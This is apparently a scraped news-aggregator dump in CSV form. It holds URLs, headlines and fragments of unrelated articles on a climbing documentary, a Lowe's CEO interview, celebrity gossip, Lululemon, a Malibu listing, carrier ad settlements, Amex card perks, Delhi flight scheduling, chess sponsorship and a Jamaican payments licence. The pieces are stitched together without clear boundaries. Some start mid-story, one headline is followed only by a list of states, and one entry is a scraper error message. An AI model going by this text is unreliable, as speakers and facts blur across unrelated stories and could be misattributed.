With wide acclaim on the festival circuit “Torn” is beginning to reach mainstream audiences. It’s crossing over from the mountain film subculture centered around Telluride Mountainfilm Banff Mountain Film Festival — where “Torn” won the Best Feature prize — 5Point Film and the like following the door-opening footsteps of Jimmy Chin’s Academy Award-winning “Free Solo.”

“I made this film with the hope that it would reach a larger audience of folks and people who don’t know anything about climbing but do know something about family and loss” Lowe said. “I think anyone who has experienced any sort of loss can relate to our story in a way. And it’s been pretty powerful to hear the feedback.”

At a Manhattan screening the night before our interview Lowe said he had several people come up and tell him their own stories of losing family members and friends. That was a sign to him that the movie is hitting the mark he hoped it would.

“It’s rooted in climbing because that’s the world that my family is in” Lowe said. “But for me it’s more a story about family and how we move through life and come up against these big painful things together and move through them.”

Now facing the public and the media and sharing the film with a global audience is still part of the healing process which remains unfinished.

“I just keep telling myself I can’t question the process” he said.

Lowe has made shorts and worked on the commercial side of outdoors filmmaking but “Torn” is his first feature-length film. It’s likely to create opportunities for him to do more. He’s uncertain of what his next project might be but he thinks he knows what it won’t be after the soul-baring experience of “Torn.”

“It’d be nice not to tell a story about my own life” he said.

I think I can speak for any Black person CEO or otherwise that when you see an episode like the murder of George Floyd and the social unrest that occurs around the country it is exhausting. We all as citizens of this country want to see our environment the places we live and the people we love protected. And we want to see a better life for our children and grandchildren from what we have had. But within that exhaustion I want to make sure that I take the lead within my own company to make sure that I educate and I put leaders in position that can allow us to be a better company.

Q. Do you think Corporate America has done enough in the aftermath of Floyd?

A. I don’t judge Corporate America. I judge Lowe’s. I’m not going to get out and start to criticize or educate other companies because I’ve got my hands full right here with 350000 associates that stretch all 50 states and have tons of complexity. What I can tell you about is what Lowe’s has done and I think we’ve made incredible progress. I think we’ve done it because it’s the right thing to do and it’s good for business.

Q. How concerned are you about the omicron variant?

A. We control what we control. So I can’t control the current variant. I can’t control future variants but I can control the health and safety of the associates and the customers. I can control what we do to support our associates. We’re trying to stay laser focused on that. We’re just trying to continue to learn be as agile as possible and try to manage the business throughout these uncertain times.

Q. What’s your vision for online?

A. We want to serve a customer any way they choose to shop. We had an inability to do that when I started over three years ago because our online infrastructure was built on a decade-old platform. If we’ve learned nothing from the pandemic we’ve learned that customers require options and choices on how they choose to shop and any retailer that doesn’t provide those options and choices in a way that take friction points out the customer is going to lose.",https://news.google.com/articles/CBMiaGh0dHBzOi8vcGVvcGxlLmNvbS90di9uaWNrLW9mZmVybWFuLWpva2VzLWFib3V0LWhpbS1hbmQtd2lmZS1tZWdhbi1tdWxsYWxseS1ib3RoLWhhdmluZy1raXNzZWQtcm9iLWxvd2Uv0gEA?hl=en-US&gl=US&ceid=US%3Aen,Nick Offerman Jokes About Him and Wife Megan Mullally Both Having Kissed Rob Lowe,"Nick Offerman and his wife Megan Mullally have a lot in common — they've both kissed Rob Lowe!

The Parks and Recreation alum 51 spoke on the hilarious fact while on The Kelly Clarkson Show Friday. Clarkson 39 noted that Offerman dished on the moment in his new book Where the Deer and the Antelope Play: The Pastoral Observations of One Ignorant American Who Loves to Walk Outside.

Mullally and Lowe shared a kiss — or as Offerman describes it ""a throat-kissing scene"" — in 1986's About Last Night. ""She played this floozy trying to distract him from Demi Moore"" Offerman told Clarkson. ""They had this crazy kissing scene.""

Offerman recalled ""randomly"" stumbling across the movie on television and seeing the kiss. ""It was so traumatic"" he joked. ""It was 15 years later but I said 'Honey you are clearly in love with Rob Lowe. This is gonna be a situation.' ""

Years later Offerman had his own lip-lock with Lowe 57 on NBC's Parks and Recreation.

""In an episode where I think Rob Lowe's character [Chris Traeger] finds out that it's [my character] Ron Swanson's birthday and he ends up kissing me on the mouth ... at which point I was like 'Okay honey I get it. Everything's cool everything's fine.' ""

""If you step back a little ways and squint you could say we've had a threesome"" he said with a laugh. ""That's how it is in Hollywood.""

Offerman and the Will and Grace star tied the knot in 2003. He told PEOPLE Now last year that the secret to their marriage is ""first and foremost we made each other laugh.""

He added ""I think that's at the heart of if any relationship is gonna survive you have to be able to laugh about things. Don't make it too serious.""

Shiba Inu has been making significant inroads with merchant adoption over the past month.



Earlier this week electronics retailer Newegg made an announcement about accepting Shiba Inu payments earlier this week.



Movie theater giant AMC also plans to add Shiba Inu in early 2022 according to CEO Adam Aron.



Moreover Shiba Inu is also supported by BitPay the world’s largest provider of crypto payments.



Yet the price of the token is down 60.39% from its lifetime peak in spite of these major adoption milestones.",https://news.google.com/articles/CBMisQFodHRwczovL3d3dy5pbnNpZGVoYWx0b24uY29tL25ld3MvaW1wb3J0YW50LW1ham9yLXJlY2FsbHMtb2Yta2l0Y2hlbi1hcHBsaWFuY2VzLXNvbGQtYXQtY29zdGNvLWhvbWUtZGVwb3QtbG93ZXMtcm9uYS1hbG9uZy13aXRoL2FydGljbGVfZGJhMTkxZjItN2MyMS01ZjY2LWI2MGYtNzVhZTU3Mzc4YjlhLmh0bWzSAQA?hl=en-US&gl=US&ceid=US%3Aen,'IMPORTANT': Major recalls of kitchen appliances sold at Costco Home Depot Lowe's RONA along with Canadian ...,"State Alabama Alaska Arizona Arkansas California Colorado Connecticut Delaware Florida Georgia Hawaii Idaho Illinois Indiana Iowa Kansas Kentucky Louisiana Maine Maryland Massachusetts Michigan Minnesota Mississippi Missouri Montana Nebraska Nevada New Hampshire New Jersey New Mexico New York North Carolina North Dakota Ohio Oklahoma Oregon Pennsylvania Rhode Island South Carolina South Dakota Tennessee Texas Utah Vermont Virginia Washington Washington D.C.

LULU,Lululemon Athletica,https://news.google.com/articles/CBMiOmh0dHBzOi8vYXRobGV0ZWNobmV3cy5jb20vbHVsdWxlbW9uLXNoYXJlcy1taXJyb3Itb3V0bG9vay_SAQA?hl=en-US&gl=US&ceid=US%3Aen,Lululemon Shares Reflect Mirror's Sluggish Outlook,"Lululemon took a dip after the company lowered its sales expectations for Mirror

Lululemon the athletic apparel brand that put yoga pants on the map has reported positive fiscal third-quarter earnings and sales but revealed it’s lowering its sales expectations for Mirror Lululemon’s at-home fitness device. Lululemon’s CEO Calvin McDonald shared that Mirror represents less than 3% of the company’s revenue this year. Despite early holiday season performance news of Mirror’s sluggish outlook led shares of Lululemon to dip.

In a recent earnings call CEO McDonald noted that he was pleased with Lululemon’s strong shares momentum in the third quarter and said it indicates the continued growth potential for the company. McDonald reported that while Lululemon’s leaders successfully implemented a growth plan during chronic supply chain challenges 2021 was a difficult year for digital fitness and it impacted Mirror.

Lululemon lowered its revenue guidance for Mirror for the year to $125-130 million according to its CEO. The company says this is an appropriate move citing the seasonality of the business but stressed that slow and steady wins the race.

“We are still early in creating our vision of a loyalty community that captures the best of Lululemon. This is not a sprint for us and we will maintain a steady pace forward that realizes our vision” McDonald said.

Lululemon plans to build and extend the community through Mirror but acknowledges the increasing pressures on customer acquisition costs in the industry.

“One of the unique advantages we bring to the space is the many ways we can build brand awareness for Mirror. As we unlock these synergies we see a clear path to engage with the more than 10 million Lululemon guests who live the sweat life. We will not chase growth at any cost. We simply don’t need to but we will invest to define our unique proposition and to bring Mirror to market through our owned marketing channels” McDonald said on the earnings call.

Lululemon says Mirror’s recent launch in Canada and connected weights were “off to a great start” allowing the company to stand out in a crowded market. Mirror’s smart weights were strategically launched before the holidays and were the latest addition to the product line-up since the interactive fitness mirror.

The company noted that supply chain issues may follow into the new year and Meghan Frank CFO said that consumers may have started holiday shopping earlier this year due to the supply chain issues. Frank went on to say that Lululemon is continuing to account for variables like Coronavirus variants and will plan for “multiple scenarios.”

Mirror recently extended its Cyber Monday sale offering the fitness device for $500 off. Last year Lululemon acquired Mirror for $500 million and integrated the fitness device into some Lululemon retail stores. The acquisition of Mirror allowed the apparel line to venture into the at-home fitness boom during COVID when the fitness industry experienced a surge in equipment and athleisure demand.

Earlier this fall Brynn Putnam who founded Mirror in 2016 stepped down as CEO. Reports emerged from current and former Mirror and Lululemon employees that the companies were struggling to blend leading to tension.

The apparel company is currently engaged in an IP battle with Peloton who first waged a preemptive attack and sued Lululemon Athletica. The interactive fitness company received a cease-and-desist letter from Lululemon alleging patent infringement. The apparel maker threatened to sue if Peloton didn’t stop selling certain apparel items and seeing its cease-and-desist letters ignored decided to file a lawsuit. Lululemon alleges that Peloton infringed on six of its patented designs and says its competitor didn’t put forth the effort to create an original line of its own. The patent infringement lawsuit includes some of Lululemon’s sports bras.",,,,,,,,,,,,

Such was the case last month when the Manhattanite 56 touched down in the City of Angels to give Page Six an exclusive tour of her $13.4 million listing in Malibu.

But before walking us through the expansive James Bond-esque property Bensimon wanted to show us how she spends a day in LA.

From catching up over coffee at her favorite hotel to luxurious facials from her go-to stem cell specialist to sipping trendy smoothies the model-turned-mogul gave us an inside look at life in the fab lane.

“I’m so excited for your to see my LA” Bensimon tells Page Six as the day kicks off. “Let’s go!”

Chic stay

Sunset Marquis 1200 Alta Loma Rd. West Hollywood Calif. 20069

Bensimon always likes to stay at the iconic Sunset Marquis Hotel which became a favorite of hers during the height of her modeling career in the ‘80s and ‘90s.

“I used to run into Bono from U2 and Elton John! This really was the place to be. And it still is! It’s very nostalgic but feels chic and new at the same time” she says over coffee in one of the hotel’s many lush outdoor spaces.

“I’ve always stayed here.”

The reality star says she spent a few nights at the Sunset Marquis during Oscars weekend in March during which she felt particularly glamorous. “I was walking down the stairs in my long red dress and I was like ‘This reminds me of when I was younger’” she says. “And it was fun!”

Benismon notes she feels like a “different person” in LA versus New York City.

“Listen I love New York and I’ve lived there for so many years. I raised my girls there” she says. “But just the quality of life is different and people are just friendly.”

When she’s in town Bensimon loves catching up with her good pal and “Real Housewives of Beverly Hills” star Sutton Stracke.

“I’m really good friends with Sutton. I love Sutton so much. I love her because she is genuinely interested and a great mom and a really good friend” she shares adding that she “just met Kyle [Richards]” this year too.

Asked if she’d ever consider moving to LA for a role on “RHOBH” Bensimon played coy. “Anything could happen!” she says with a laugh. “Who knows?”

Fabulous facials

Nathan Newman M.D. 9301 Wilshire Blvd #303 Beverly Hills Calif. 90120

Bensimon says her “first stop” in LA is always the Beverly Hills office of plastic surgeon Dr. Nathan Newman — a pioneer in stem cell therapy — who is renowned for his stem cell facials.

“These stem [cell] facials are unbelievable. I’m serious my skin has never looked better” she says. “The stem really hydrates my skin and is removing some of the wrinkles not all of them.”

Bensimon loves that the procedure hydrates her face rather than freezing it like other noninvasive cosmetic procedures. “I’m like ‘Listen I spent a long time smiling. Do not take away those memories’” she says giving fine lines and wrinkles a sweet rebrand.

12 Bensimon introduced us to Dr. Newman who gave us one of his famous skincare treatments.

After being introduced to Dr. Newman he told me to get ready for a “facial like [I’ve] never had before” — and he was right. It was transformative.

The relaxing hourlong treatment — which uses his plant-based stem cell serums — gave my skin an instant refresh and dewy glow.

Bensimon says she relies on Dr. Nathan whenever she finds herself in an epidermal crisis.

“My first [stem cell facial] was literally right after BravoCon [2023]” she recalls. “I was exhausted and so I came to Dr. Nathan Newman and I was like ‘I am so haggard. I’m feeling like not myself I’m feeling like totally someone else.’ And I had the facial and I’m telling you I was just like ‘Woah.’”

Trendy treats

Erewhon 339 N. Beverly Dr. Beverly Hills Calif. 90210

As Angelenos are well aware Erewhon is the grocery store to the stars — including Bensimon — so we made a visit to the Beverly Hills outpost.

“I started going to Erewhon because my oldest daughter [Sea Louise] was like ‘You have got to try these smoothies they are over the top’” she says of the 26-year-old’s assessment of the Erewhon’s tentpole creations.

12 We made a stop at Erewhon where Bensimon loves to fuel up on their smoothies.

Celebrities like Hailey Bieber Winnie Harlow Sofia Richie Molly Simms and Dr. Paul Nassif have signature smoothies on the menu but Bensimon prefers to procure her own blend.

For the both of us she ordered smoothies packed with greens greek yogurt and cayenne pepper that she raved would “jumpstart our metabolisms” as swimsuit season approaches.

Yes please!

‘Real Housewife’ of real estate

21056 Las Flores Mesa Dr. Malibu Calif. 90265

Bensimon — a broker with Douglas Elliman who has sold hundreds of millions of dollars in real estate since obtaining her license as an agent in 2019 — was particularly thrilled to explore her seaside listing at 21056 Las Flores Mesa Dr. with Page Six in tow.

“I just feel like this is a beautiful beautiful property. It has heritage it’s in Malibu Calif. it’s one of a kind” she says of the 3-bedroom 3-bathroom manse designed by celebrated architect Harry Gesner and built in 1997.

12 “It’s very ‘007’ very cinematic” the Bravolebrity raves. Page Six

12 She even showed us the furnished airstream outside — where she also took a break to sing an original tune inspired by the palatial property.

“He’s known for the wood and also the brick. He loves that juxtaposition. It’s very ‘007’ very cinematic” she elaborates acknowledging that the owners’ interior design choices were inspired by their love of the “James Bond” films.

Bensimon also points out the “stunning views” of the Pacific Ocean visible through the home’s cathedral-like windows from the pool and even from a furnished airstream located in the backyard.

“For me real estate just resonates so much because I love art and architecture so much” she tells Page Six. “My favorite part of the job outside of the aesthetic is making sure that my clients have what they need and what they want. That is very rewarding.”",https://news.google.com/articles/CBMiZWh0dHBzOi8vd3d3LnRoZXZlcmdlLmNvbS8yMDI0LzUvMTAvMjQxNTM4OTIvdmVyaXpvbi10bW9iaWxlLWF0dC11bmxpbWl0ZWQtcGxhbi1mcmVlLXBob25lLW9mZmVycy1maW5l0gEA?hl=en-US&gl=US&ceid=US%3Aen,Verizon AT&T and T-Mobile's “unlimited” plans just got a $10M slap on the wrist,"Verizon AT&T and T-Mobile will pay a combined $10.22 million to a group of states to settle claims that the carriers lied to customers about their “unlimited” plans and “free” phone offers. The settlement which follows an investigation from a coalition of 50 attorneys general requires the three companies to make their advertisements more transparent.

Under the terms of the agreement Verizon T-Mobile and AT&T can only advertise their plans as “unlimited” if there are no limits on how much data someone can use during a billing cycle. The ads must “clearly and conspicuously” say that restrictions on speed may apply as well as specify the amount of data customers can use before triggering the slowdown.

Additionally the attorneys general went after the allegedly misleading claims Verizon T-Mobile and AT&T made in ads promising to “pay” customers to switch carriers. All three companies must now clearly disclose the terms and conditions associated with the offer including how much a customer will be paid and when they will receive their payment. The carriers must also disclose the requirements customers must meet to receive “free” phone offers along with any hidden fees.

“AT&T Verizon and T-Mobile lied to millions of consumers making false promises of free phones and ‘unlimited’ data plans that were simply untrue” New York Attorney General Letitia James says in a statement. “Big companies are not excused from following the law and cannot trick consumers into paying for services they will never receive.”

Verizon T-Mobile and AT&T will also have to appoint a “dedicated representative” to field customer complaints. The three companies deny any wrongdoing. “These voluntary agreements reflect no finding of improper conduct and reaffirm the wireless industry’s longstanding commitment to clarity and integrity in advertising so that consumers can make informed decisions about the products and services that best suit them” Nick Ludlum the senior vice president of the CTIA the trade group representing the carriers tells The Verge.",https://news.google.com/articles/CBMiYGh0dHBzOi8vd3d3LnNmZ2F0ZS5jb20vcmVhbGVzdGF0ZS9hcnRpY2xlL21hZ2ljYWwtdHJlZWhvdXNlLWxpa2UtaG9tZS1vYWtsYW5kLWhpbGxzLTE5NDUxMDQzLnBocNIBAA?hl=en-US&gl=US&ceid=US%3Aen,'Magical' $1.8M treehouse-like home in the Oakland Hills for sale,ERROR: Article `download()` failed with 403 Client Error: Forbidden for url: https://www.sfgate.com/realestate/article/magical-treehouse-like-home-oakland-hills-19451043.php on URL https://news.google.com/articles/CBMiYGh0dHBzOi8vd3d3LnNmZ2F0ZS5jb20vcmVhbGVzdGF0ZS9hcnRpY2xlL21hZ2ljYWwtdHJlZWhvdXNlLWxpa2UtaG9tZS1vYWtsYW5kLWhpbGxzLTE5NDUxMDQzLnBocNIBAA?hl=en-US&gl=US&ceid=US%3Aen,https://news.google.com/articles/CBMifmh0dHBzOi8vd3d3LmZveGJ1c2luZXNzLmNvbS9saWZlc3R5bGUvcmFyZS1taWNoYWVsLWpvcmRhbi1jYXJkLWNvdWxkLWZldGNoLTVtLWF1Y3Rpb24ta2VuLWdvbGRpbi1yZXZlYWxzLTEwMC1iZXN0LWNvbGxlY3RpYmxlc9IBggFodHRwczovL3d3dy5mb3hidXNpbmVzcy5jb20vbGlmZXN0eWxlL3JhcmUtbWljaGFlbC1qb3JkYW4tY2FyZC1jb3VsZC1mZXRjaC01bS1hdWN0aW9uLWtlbi1nb2xkaW4tcmV2ZWFscy0xMDAtYmVzdC1jb2xsZWN0aWJsZXMuYW1w?hl=en-US&gl=US&ceid=US%3Aen,Rare Michael Jordan card could fetch $5M at auction: Ken Goldin reveals '100 best collectibles',"Goldin Auction’s second annual Goldin 100 event displays the rarest and most valuable collectibles of the year.

The auction also features a 1957 Mickey Mantle game-used jersey that Goldin expects to be a seven-figure item — along with a pair of Michael Jordan’s shoes that the star wore during the Aug. 1985 game when he shattered a backboard.

""The glass collapsed down and [the shoe] actually has a piece of glass in it"" Goldin said. ""It’s the only time Michael Jordan ever broke a backboard in his pro career.""

Among the items in other categories Goldin is auctioning off a highest-grade copy of the first-ever issue of Playboy Magazine featuring Marilyn Monroe on the cover and a rare copy of a Superman No. 1 DC comic book from 1939.

""We even have Harry Houdini’s belt buckle that he was wearing the night he performed his last act and died"" Goldin said.

View the current offers here.

Although perks like unparalleled airport lounge access an up to $200 annual airline credit up to $200 annual prepaid hotel statement credit and up to $200 annual Uber credit (for U.S. services) may seem like the most valuable benefits of The Platinum Card® from American Express there are a number of lesser-known perks the card offers. Among them are Premium Global Assist and trip insurance. (Enrollment required.)

These protections are separate from perks like baggage insurance — they assist with more severe issues like emergency medical transportation and unforeseen trip cancellations. While we all hope never to have to use these benefits they're worth familiarizing yourself with as they can save you a ton of money and aggravation if you are in a time of need.

Delta SkyMiles® Reserve American Express Card

Delta SkyMiles® Reserve Business American Express Card

Marriott Bonvoy Brilliant® American Express® Card

For example TPG reader Joseph was able to get tremendous value from the Global Assist Hotline during a trip to New Zealand when both of his children got sick and he needed help finding reputable medical facilities nearby.

While most services the hotline coordinates for you are at your own expense there are some benefits available to Platinum and Centurion cardholders at no cost. They include emergency medical transportation and evacuation — if the Amex physician or local physician decides that it is medically necessary and advisable due to inadequacy of local facilities — and repatriation of mortal remains.

There are some important exclusions such as pre-existing conditions and refusal of permission by local authorities so you'll want to read the full terms and benefits guide (warning: PDF link) for your card. Also note that the coverage is only for the cost of evacuation not the actual medical care.

What's covered by trip insurance?

Amex offers two types of trip insurance benefits: trip delay insurance and trip cancellation and interruption insurance. They're pretty self-explanatory but here's what you need to know.

With the trip delay insurance provided by the cards listed above you'll be reimbursed for unexpected expenses — such as meals lodging and personal-use items — if your trip is delayed by more than six hours due to a covered reason. You're covered up to $500 per trip so long as you booked round-trip flights and paid entirely with an eligible card (if you paid taxes and fees on award tickets or Pay With Points tickets that is also covered).

Amex defines round-trip tickets as travel consisting of ""roundtrip one-way or combinations of roundtrip or one-way tickets."" So for example an itinerary bringing a covered traveler from New York to Los Angeles then back from San Francisco to New York would qualify.

Some of Amex's mid-tier cards offer trip delay protection as well but only for delays of more than 12 hours with reimbursement of only up to $300.

On the other hand trip cancellation and interruption insurance provide reimbursement for covered expenses when you are forced to cancel or cut a covered trip short for an eligible reason. If you qualify you may receive reimbursement of non-refundable travel expenses of up to $10000 per trip with a maximum of up to $20000 per eligible account for each consecutive 12-month period.

Covered reasons for canceled trips include inclement weather terrorist action call to jury duty or sudden illness or injury to you or an eligible traveler. Again you must book ""round-trip"" travel paid for entirely using your eligible card to be covered.

Airlines asked to reschedule

Per multiple reports first from The Economic Times and then Business Standard there will be most probably a reschedule of flight timings for flights operated by the turboprop Q400 and ATR42/ATR72 aircraft into Delhi Airport. While the Economic Times states that the move was prompted by the government wanting to decongest airports Business Standard says this is done to ensure these flights don’t operate when fog and low visibility are witnessed in Delhi.

The turboprops are slower aircraft. Hence they take longer to evacuate the runway on arrival affecting total takeoff/arrivals and hence scoffed upon amongst the jets at congested airports. Although as per reports these aircraft are also not equipped to fly under CAT III operations which are required for low-visibility take-off and landings.

Delhi has about 70 flights operating on a daily basis with the turboprops which operate with Alliance Air IndiGo and SpiceJet and these aircraft will now have to reschedule their flights between 10 am and 9 pm. Airlines operate turboprop aircraft from Delhi to Jodhpur Shimla and Kullu among others.

There were 14 turboprop aircraft with night parking slots at Delhi including 7 ATR72-600s of Alliance Air five Q400 of SpiceJet and two ATR 72-600 of IndiGo as per Network Thoughts. While the winter schedule just got into effect about 40 days ago changing it again makes no sense because it will impact aircraft rotations altogether and if this was a problem the concerns should have been raised much earlier so we got to see how far will this move to reschedule flight timings go forward.

Although if the operations of turboprops are totally banned then it means toast for Delhi-based Alliance Air and it will largely affect SpiceJet which also has a large number of turbo-props based in Delhi. Also stations such as Kullu and Dharamshala which can only take turbo-props will have to be closed down for the time being.

This is not the first time such a move has been made. Back in 2014 as well such a ban was imposed.

Bottomline

Check your flights to see if any schedule change or cancellation is in order if you were booked to fly on a route operated with a turboprop aircraft. This would impact downstream operations as well for most airlines as well and the timeline is very short just four days to reschedule everything.

Are you booked to fly an ATR or a Q400 in the next few weeks in or out of Delhi? Have you heard from the airline about a change of times or cancellation of your flight?

Magnus Carlsen’s hair is disheveled his beard messy and his white shirt tucked out. But leaning forward on his gaming chair he towers over the chess board supremely confident.

In contrast his challenger Ian Nepomniachtchi looks despondent and resigned to defeat. He faces an almost insurmountable task in the World Chess Championship and surveying the board one last time smiles knowingly and stops the clock. He’s resigned the round and title to the now-five time world champion Carlsen.

The attritional games are being held in the Expo 2020 Dubai exhibition center and crowds throng the main atrium to catch a glimpse of the players. In the hall itself advertising hoardings are plastered around the soundproof box the players sit in.

Despite losing the Russian grandmaster will take home $905000 in prize money alone. That figure might seem high but brands can pay millions for advertising packages that have their names on stage at events like this the International Chess Federation (FIDE) tells CNN.

Mastercard and Unibet logos are emblazoned on Carlsen’s shirt and on the back of his chair sits Coinbase the cryptocurrency exchange platform.

Sponsors Kaspersky and Phosagro Russian cybersecurity and chemicals companies respectively have made sure their names are printed on the game table.

Advertisements for Algorand the decentralized blockchain network where World Chess’ player profiles and ratings are recorded are everywhere. They even intermittently punctuate the live stream of the event being shown on a football stadium-sized screen in the exhibition hall.

The millions around the world watching that feed in their homes see those names for hours every day across two weeks.

Chess is now marketable and since its popularity boomed during the pandemic and following the release of the hit Netflix series “The Queen’s Gambit” the game is now turning over serious profits and sharing the wealth.

Putting on a show

Vishy Anand a former world champion dethroned by Carlsen and Anna Muzychuk a top female player are in a commentary box dissecting each move and possible variation.

The two mental gladiators enter the arena like boxers while being introduced by the booming voice of Jamaican-American grandmaster Maurice Ashley. A representative of a corporate sponsor ceremoniously makes the first move.

FIDE is keen to show just how popular chess has become and more importantly the commercial potential of the game of kings.

NBC Sports has aired daily 25-minute game recap programs. After Game Four it was the most-watched sports segment on the channel that day according to FIDE.

After the game FIDE tells CNN that within a few minutes of the conclusion there were 37200 publications about the match already printed.

In a room above the auditorium more representatives of the corporate sponsors mill about enjoying wine and finger food. There to greet CNN is Hans Niemann an 18-year-old grandmaster from New York who is ranked just outside the top 100.

“In America up and coming talent I’m number one” he tells CNN. “There is nobody who compares to my potential.”

The US junior champion is part of a generation that has found another way to generate revenue from playing chess – streaming.

“I actually turned down a huge sponsorship deal that offered me to just play chess online” he says.

He has taken a step back from streaming for now to focus on his over-the-board career but at his peak he estimates he was earning 6000-10000 dollars a month from donations and sponsorship on Twitch the Amazon-owned livestreaming platform.

That’s peanuts compared to the most watched chess players on the site.

The Botez sisters Alexandra and Andrea have one million followers on Twitch and told CNBC in February that they make six figures a year.

Playing the money game

Carlsen’s private sponsorship agreements with the aforementioned Mastercard and Unibet are but two of many. Simonsen Vogt Wiig a Norwegian law firm Isklar a Norwegian water company and Meltwater a software company founded in Oslo all appear on his jacket and shirt.

But Carlsen has mainly made his small fortune from the digital revolution. He co-founded PlayMagnus in 2013 a company that now functions as an e-learning site with book publishing and online playing arms.

It has over 60000 monthly paying users and booked revenue of almost $10 million in the first half of 2021.

Trading publicly on the Euronext Growth Oslo stock exchange its market capitalization is around $106 million and it has acquired subsidiaries such as Everyman Chess and New in Chess.

Magnus Chess AS the company Carlsen founded as a teenager to handle his winnings and which he owns the majority of owns 8.9% of Play Magnus.

“There are a huge amount of people who have discovered chess and they will continue to do so” Carlsen’s father Henrik tells CNN after his son’s victory Friday.

“Streaming is a very important part of the entertainment in chess” Henrik who sits on the board of Play Magnus adds.

Other major shareholders mostly banks are winning too and some of his company’s employees are even beginning to act as de facto agents for younger players – including Niemann who is a brand ambassador.

The partnership will involve Niemann playing in Carlsen’s Champions Chess Tour and producing courses under a Play Magnus subsidiary Chessable while he receives support to play.

“Old chess has lagged behind compared to other sports when it comes to commercialization and accessibility” says Espen Agdestein a former manager of Carlsen and a co-founder of Play Magnus.

“The internet provides chess with a huge opportunity because chess is exactly the same online unlike other sports. Tennis isn’t the same when played online for example.”

He predicts that this is only the beginning and sees chess growing next in the world of blockchain.

Fans can already buy an NFT version of The Champions Chess Tour (Play Magnus’s own competition) trophy and former world champion Garry Kasparov has launched his own NFT collection which includes old photographs and trophies won by the Russian grandmaster.

“Chess players are interested in engineering and finance and they are looking for more audiences all the time. The blockchain companies have a lot of money” says Agdestein.

“This is a great time for the sport and every parent would like to see their kids play chess” he concludes.

When this is the type of cash involved who wouldn’t want their children aiming to reach the top of the money game?",https://news.google.com/articles/CBMidGh0dHBzOi8vamFtYWljYS1nbGVhbmVyLmNvbS9hcnRpY2xlL2J1c2luZXNzLzIwMjExMjEwL3VwZGF0ZS1sYXNmaW4tZGVhbGluZ3MtYWxsaWFuY2Utc2FpZC1vbmx5LWltcGFjdC1sYXNjby1wYXktbm930gEA?hl=en-US&gl=US&ceid=US%3Aen,UPDATE: LasFin dealings with Alliance said only to impact Lasco Pay for now,"Lasco Financial Services Limited struck a deal with Alliance Payment Services Limited in 2019 to launch a co-branded ePay MasterCard through Lasco Pay that would allow for cashless transactions with its remittance business unit.

But the deal with Alliance Payment Services an affiliated company of Alliance Financial Services could be up for review following action taken by the Bank of Jamaica BOJ against Alliance Financial for alleged breaches of the Bank of Jamaica Act the Banking Services Act and the Proceeds of Crime Act. The central bank suspended Alliance Financial's licence to operate cambio and remittance services and revoked its authorisation to operate in the BOJ Fintech Regulatory Sandbox.

The BOJ awaits the outcome of a pending court case involving the principals of Alliance Financial Services Peter Chin and Robert Chin before deciding on the next step for the entity. The court hearing is set for December 16.

In the meantime all Lasco Pay cardholders will be able to continue using their cards without disruption until the funds have been depleted Managing Director of Lasco Financial Services Jacinth Hall-Tracey told the Financial Gleaner on Thursday.

She did not detail the next steps for the company which has been working to deepen transactions with the unbanked over the years through the provision of MasterCard co-branded products which is intended to not only limiting customers’ trips to remittance locations but also provide a safer means of conducting transactions particularly in the yuletide season.

Headlines Delivered to Your Inbox Sign up for The Gleaner’s morning and evening newsletters.

Lasco Financial however just recently launched a prepaid Visa card also issued through Lasco Pay that it could move its cashless business to. The microfinancing and money services company is also in the process of devising other fintech products through the BOJ’s innovation unit known as its fintech sandbox. The central bank’s sandbox is designed to test innovative financial products services and businesses in a cost-effective way.

Lasco Financial has already begun work on Lasco Biz a new tech-driven cashless business model system designed especially but not exclusively for micro small and medium-sized businesses. Under Lasco Biz the microfinancing firm will act as a merchant aggregator – or a super merchant to a preferred banking institution – in facilitating the small entrepreneurs with or without a bank account.

The service is expected to be particularly useful to entrepreneurs who wish to expand their sales and conduct cashless transactions conveniently across countries. Lasco Financial could arrange for income earned from sales to be transferred to business owners through one of its prepaid cards or leverage its countrywide network of MoneyGram stores.

“Lasco Biz is not impacted” said Hall-Tracey regarding Lasco’s partnership with Alliance Financial but she otherwise would not say whether any other fintech projects in the sandbox would be affected by the central bank’s revocation of Alliance Financial’s participation.

Alliance Financial was formed in 2004 to take over the cambio services business that was being operated by Alliance Investment Management Limited. Alliance Financial was also appointed an agent of MoneyGram that same year.

As a result of the BOJ action Alliance Financial is not authorised to conduct the business of buying and selling foreign exchange. It is also not authorised to offer MoneyGram remittance services during the suspension of its licence.

Lasco Financial is a primary agent of MoneyGram as are JN Money Services Limited and VMBS Money Transfer Services Limited all three of which the BOJ has listed as alternatives to Alliance.

Following the Bank of Jamaica’s (BOJ) decision to suspend Alliance Financial Services Limited’s (AFSL) cambio and remittance licence plus the revocation of their authorisation in the Fintech Regulatory Sandbox ePay affiliates have been left scrambling to make alternative plans ahead of the busy Christmas season and upcoming school year.

AFSL acquired the card services portfolio of Alliance Payment Services Limited (APS) on October 1 2020 which held the proprietary brand ePay. AFSL began to issue a prepaid Mastercard in May 2018 which was meant to improve financial inclusion capture a greater share of the remittance market and earn fee income. This led to the company co-branding arrangements with different entities including Lasco Financial Services Limited (LASF) Community & Workers of Jamaica (CWJ) Co-operative Credit Union Limited Jamaica Civil Service Association (JCSA) and Mailpac Group Limited. The ePay services also extended to student cards used at primary and secondary schools along with a prepaid card at both international airports for payment of services with different airlines.

According to the BOJ existing holders are still able to use the card until the funds are depleted but cannot withdraw nor top up with additional funds. As a result it also cannot process bill payments for clients. LASF has already noted that its Lasco Pay offering has been impacted relating to its prepaid Mastercard which clients used to receive remittances and carry out daily transactions. Though clients can opt to receive remittance payments to their bank account directly the company will be under additional pressure during the Christmas season as it remains one of the three approved entities in the market to process MoneyGram transactions. LASF is currently testing its prepaid Visa card dubbed ‘Lasco Gold’ under the BOJ’s sandbox.

Some schools have already prompted parents who used the ePay student card to no longer use the option and that new options will be ready by December 13. The ePay card acted as a way for students to top up with cash and use the card at school and at merchants who accepted ePay.

Sunday Finance reached out to some of the other entities in the co-branded partnership but did not receive a response up to press time.

The JCSA has more than 26000 members with the other partners having thousands of clients as well. Mailpac had just launched the prepaid card in April to the public.

A Caribbean Airlines spokesperson confirmed that they still accept cash unlike other airlines which have gone cashless. In September 2018 AFSL launched outlets at the Sangster International Airport and Norman Manley International Airport to allow customers to purchase a prepaid card to pay for a flight or extra bags at the kiosks.

